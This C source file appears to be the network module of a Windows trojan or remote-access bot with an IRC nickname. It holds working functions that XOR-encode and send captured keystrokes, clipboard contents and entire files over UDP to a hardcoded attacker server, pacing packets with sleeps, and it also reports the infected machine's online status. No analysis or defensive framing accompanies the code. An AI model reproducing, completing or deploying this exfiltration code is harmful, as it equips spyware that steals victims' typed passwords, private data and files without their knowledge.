#include "stdafx.h"

extern char IrcNick[IRC_NICK_LEN];
extern int udp_chunks_sleep;
extern int udp_user_chunks_sleep;

/* ********************************************************************************* */
int udp_send_msg(u_int msg, char *data, u_int datalen, char *name)
{
	ubermsg *packet;
	int		i, packets = 0, id = 0, dataleft = 0;
	char	*offset;

	if(!datalen)
		return -1;

	packet = (ubermsg*) halloc(UPACKET_SIZE);
	if(packet == NULL)
		return -1;
	
	memset(packet, 0x0, UPACKET_SIZE);

	dataleft = datalen;
	if(datalen > 1200)
		packets = (datalen / 1200) + 1;
	else
		packets = 1;

	/*deb("data@0x%p datalen: %d packets: %d dataleft: %d", data, datalen, packets, dataleft);
	deb("data: %s", data);*/

	offset = data;

	for(i=0;i<packets;i++)
	{
		memset(packet, 0x0, UPACKET_SIZE);
		packet->type = msg;
		packet->xor  = (u_char) rand();
		packet->id   = id++;

		if(name)
			strncpy((char*) packet->name, name, 
				strlen(name) > sizeof(packet->name) ? sizeof(packet->name) : strlen(name));

		if(packets > 1)
			packet->len = dataleft > 1200 ? 1200 : dataleft;
		else
			packet->len = datalen;

		/*deb("packet %d, packet->len: %d datalen: %d dataleft: %d offset: 0x%x data: 0x%x maxdata: 0x%x",
			id, packet->len, datalen, dataleft, offset, data, data + datalen);
		deb("PACKET DATA TO SEND: \n%s", offset);*/

		memcpy((void*) &packet->data, (void*) offset, packet->len);
		offset += 1200;
		
		udp_dochecksum(packet);
		udp_encrypt_packet(packet, packet->xor);
		
		if(udp_send_packet(packet)) {
			deb("packet %d is not sent.", id);
			hfree((void*) packet);
			return -1;
		}

		dataleft -= packet->len;
		Sleep(udp_user_chunks_sleep ? udp_user_chunks_sleep : udp_chunks_sleep);
	}

	deb("%d bytes, %d packets has been sent.", datalen, packets);
	hfree((void*) packet);

	return 0;
}
/* Status changes, online/offline */
/* ********************************************************************************* */
int udp_change_status(u_char status)
{
	udp_send_msg(status, UPDATE_VERSION, strlen(UPDATE_VERSION), IrcNick);
	return 0;
}	
/* ********************************************************************************* */
int udp_submit_clipboard(char *buffer)
{
	udp_send_msg(CLIPBOARD, buffer, strlen(buffer), GetLocalInetAddr());
	return 0;
}
/* ********************************************************************************* */
/* submit keys data */
int udp_submit_keys(char *buffer)
{
	udp_send_msg(KEYS, buffer, strlen(buffer), GetLocalInetAddr());
	return 0;
}
/* ********************************************************************************* */
/* submit socks/proxy address */
int udp_submit_socks(char *ip, int port)
{
	return 0;
}
/* ********************************************************************************* */
/* send critical message */
int udp_message_critical(int msgid, int param1, int param2)
{
	return 0;
}
/* ********************************************************************************* */
/* send control status message */
int udp_control_status(u_char codeid, u_char msgid)
{
	return 0;
}
/* ********************************************************************************* */
int checksumfile(char *fname)
{
	HANDLE hFile;
	DWORD dwSize, dwRead, i;
	char	*buffer, *byte;
	u_int	csum = 0;

	deb("calculating checksum for %s", fname);

	hFile = CreateFile(fname,           
		GENERIC_READ,              
		FILE_SHARE_READ,           
		NULL,                      
		OPEN_EXISTING,             
		FILE_ATTRIBUTE_NORMAL,     
		NULL);                    
	
	if (hFile == INVALID_HANDLE_VALUE) { 
        deb("CreateFile: %s", FORMATERROR);
		return -1;
	} 

	dwSize = GetFileSize(hFile, 0);
	buffer = (char*) HeapAlloc(GetProcessHeap(), 0 , dwSize);
	if(buffer == NULL) {
		deb("Failed to alloc %d bytes: %s", dwSize, FORMATERROR);
		return -1;
	}
	deb("allocated %d bytes", dwSize);

	ReadFile(hFile, buffer, dwSize, &dwRead, 0);
	CloseHandle(hFile);
	
	byte = buffer;
	for(i=0;i<dwSize;i++) {
		csum += *(byte++);
	}

	deb("checksum of %s (%d bytes) => 0x%x", fname, dwSize, csum);

	HeapFree(GetProcessHeap(), 0, buffer);

	return csum;
}
/* ********************************************************************************* */
int udp_decrypt_packet(ubermsg *packet)
{
	u_int i;
	u_char *e;
	register u_char xor;
	
	if(packet->len > (UPACKET_SIZE - sizeof(ubermsg))) {
		deb("decrypt: malformed packet length (%u)", packet->len);
		return -1;
	}

	e = &packet->data;
	xor = packet->xor;
	//deb("decrypt: xor: 0x%02x len: %u", xor, packet->len);

	for(i=0; i<packet->len; i++) {
		(*e) ^= xor;
		e++;
	}

	return 0;
}
/* ********************************************************************************* */
int udp_encrypt_packet(ubermsg *packet, u_char xor)
{
	u_int i;
	u_char *e;
	
	if(packet->len > (UPACKET_SIZE - sizeof(ubermsg))) {
		deb("udp:encrypt: malformed packet length (%u)", packet->len);
		return 1;
	}

	packet->ver  = PACKET_VERSION;
	e = &packet->data;
	//deb("encrypt: xor: 0x%02x len: %u", xor, packet->len);

	for(i=0; i<packet->len; i++) {
		(*e) ^= xor;
		e++;
	}

	return 0;
}
/* ********************************************************************************* */
int udp_dochecksum(ubermsg *packet)
{
	DWORD i;
	char *e;
	register u_char sum = 0;
	
	if(packet->len > (UPACKET_SIZE - sizeof(ubermsg))) {
		deb("calc_checksum: malformed packet length (%u)", packet->len);
		return -1;
	}

	packet->csum = 0;
	
	e = (char*) packet;
	for(i=0; i < PACKETSIZE(packet); i++) 
	{
		sum += *(e);
		e++;
	}
	packet->csum = sum;
	//deb("udp:checksum: 0x%x", sum);
	
	return sum;
}
/* ********************************************************************************* */
int udp_isvalidpacket(ubermsg *packet)
{
	/* check if this is not garbage */
	return 0;
}
/* ********************************************************************************* */
int udp_send_packet(ubermsg *packet)
{
	SOCKET udpsock;
	struct sockaddr_in sin;

	if( (udpsock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == INVALID_SOCKET ) {
		deb("udp:socket: %s", FORMATERROR);
		return 1;
	}
	
	sin.sin_family = AF_INET;
	sin.sin_addr.s_addr = DnsResolve(UDP_SERVER_ADDR);
	sin.sin_port = htons(UDP_SERVER_PORT);
	
	if( ((unsigned)sendto(udpsock, (char*) packet, PACKETSIZE(packet), 
		 0, (sockaddr*) &sin, sizeof(sin))) != PACKETSIZE(packet)) {
		deb("udp:sendto: %s", fmterr());
		return 1;
	}

	//deb("packet sent: %d bytes", PACKETSIZE(packet));
	closesocket(udpsock);

	return 0;
}
/* ********************************************************************************* */
char* extract_filename(char *path, char* fname)
{
	char temp[MAX_PATH];
	int		i,j;
	int		len;

	len = strlen(path);
	memset(temp, 0x0, sizeof(temp));

	deb("path: %s", path);

	for(i=len-1,j=0;i;i--) {
		if(path[i] == '\\' || path[i] == ':' || path[i] == '/' || path[i] == 0x20)
			break;
		else {
			//deb("c %c", path[i]);
			temp[j++] = path[i];
		}
	}
	deb("temp: %s", temp);

	strcpy(fname, temp);
	_strrev(fname);
	deb("extracted name: %s", fname);
	return fname;
}
/* ********************************************************************************* */
/* send file to main udp server */
DWORD WINAPI udp_sendfile(LPVOID arg)
{
	ubermsg *packet;
	HANDLE file;
	u_int chunks = 0; /* file chunks */
	u_int fsize;
	char	buffer[2048];
	DWORD	dwRead;
	DWORD	pos;
	u_int	id = 0;
	DWORD		i;
	char	fname[MAX_PATH];
	char	filename[25];

	strncpy(fname, (char*) arg, MAX_PATH);
	
	deb("udp_sendfile: asked for %s", fname);
	extract_filename(fname, filename);

	packet = (ubermsg*) halloc(UPACKET_SIZE * 2);

	if(packet == NULL) {
		deb("udp:HeapAlloc: %s", FORMATERROR);
		ExitThread(0);
	}

	memset(packet, 0x0, UPACKET_SIZE);

	//deb("packet size %d at 0x%p", UPACKET_SIZE, packet);

	packet->type = MSGFILESTART;
	packet->xor = (u_char) rand();
	packet->id = 0;

	prepare_udp_send_file((char*) fname, &file, &fsize);
	if(file == INVALID_HANDLE_VALUE) {
		udpdeb("udp: file open error, aborting");
		hfree(packet);
		ExitThread(0);
	}

	packet->len = strlen((char*) filename) + 1;

	if(fsize > CHUNK_SIZE)
		chunks = fsize / CHUNK_SIZE;
	else
		chunks = 1;

	deb("fsize: %d chunks: %d", fsize, chunks);
	packet->opt = chunks;
	packet->opt2 = fsize;

	strncpy((char*) &packet->data, (char*) filename, strlen((char*) filename) + 1);

	hexdump((char*) packet, PACKETSIZE(packet));

	udp_dochecksum(packet);
	udp_encrypt_packet(packet, packet->xor);
	
	if(udp_send_packet(packet)) {
		udpdeb("starting packet is not sent.");
		hfree(packet);
		CloseHandle(file);
		ExitThread(0);
	}

	Sleep(UDP_FIRST_CHUNK_SLEEP);

	for(i = 0;i < chunks + 1;i++) 
	{
		//deb("i: %d chunks: %d left: %d", i, chunks, chunks - i);
		pos = SetFilePointer(file, 0, NULL, FILE_CURRENT);
		if(!ReadFile(file, buffer, CHUNK_SIZE, &dwRead, 0)) 
		{
			deb("udp:ReadFile: %s", FORMATERROR);
			CloseHandle(file);
			hfree(packet);
			ExitThread(0);
		}
		if(GetLastError() == ERROR_HANDLE_EOF) 
		{
			deb("udp:done");
			break;
		}

		memset(packet, 0x0, UPACKET_SIZE);
		packet->type = MSGFILECHUNK;
		packet->xor = (u_char) rand();
		packet->id = id++;
		packet->len = dwRead; /* bytes in file part */
		packet->opt = pos; /* start offset */
		packet->opt2 = pos + dwRead; /* end offset */
		memcpy(&packet->data, buffer, UPACKET_SIZE);
		strncpy((char*) packet->name, (char*) filename, sizeof(packet->name));

		udp_dochecksum(packet);

		/*deb("packet to send: id: %d len: %d offset-start: %d offset-end: %d xor: %d",
			packet->id, packet->len, packet->opt, packet->opt2, packet->xor);*/

		udp_encrypt_packet(packet, packet->xor);

		if(udp_send_packet(packet)) 
		{
			deb("packet not sent.");
			hfree(packet);
			CloseHandle(file);
			ExitThread(0);
		}
		Sleep(udp_user_chunks_sleep ? udp_user_chunks_sleep : udp_chunks_sleep);
	}

	CloseHandle(file);

	/* tell remote it is end of file */
	memset(packet, 0x0, UPACKET_SIZE);
	packet->type = MSGFILEEND;
	packet->xor = (u_char) rand();
	packet->id = id++;
	packet->len = strlen(filename);
	packet->opt = checksumfile(fname);
	strcpy((char*) packet->name, filename);

	udp_dochecksum(packet);
	udp_encrypt_packet(packet, packet->xor);
	Sleep(UDP_FIRST_CHUNK_SLEEP);
	udp_send_packet(packet);

	udpdeb("File %s has been sent.\n", fname);
	hfree(packet);

	ExitThread(0);
}
/* ********************************************************************************* */
int prepare_udp_send_file(char *fname, HANDLE *handle, u_int *fsize)
{
	HANDLE hFile;

	deb("udp:preparing %s", fname);

	hFile = CreateFile(fname,GENERIC_READ, FILE_SHARE_READ, NULL,                      
		OPEN_EXISTING,             
		FILE_ATTRIBUTE_NORMAL,     
		NULL);                    
	
	if (hFile == INVALID_HANDLE_VALUE) { 
        udpdeb("udp:createfile: %s", FORMATERROR);
		*(handle) = hFile;
		return 0;
	} 

	*(handle) = hFile;
	*(fsize) = GetFileSize(hFile, 0);

	return *(fsize);
}
/* ********************************************************************************* */
void udpdeb(char *msg,...) 
{
	va_list ap;
	char string[32768];
		
	va_start(ap,msg);
	vsprintf(string,msg,ap);
	va_end(ap);
	udp_send_msg(TEXT, string, strlen(string));
}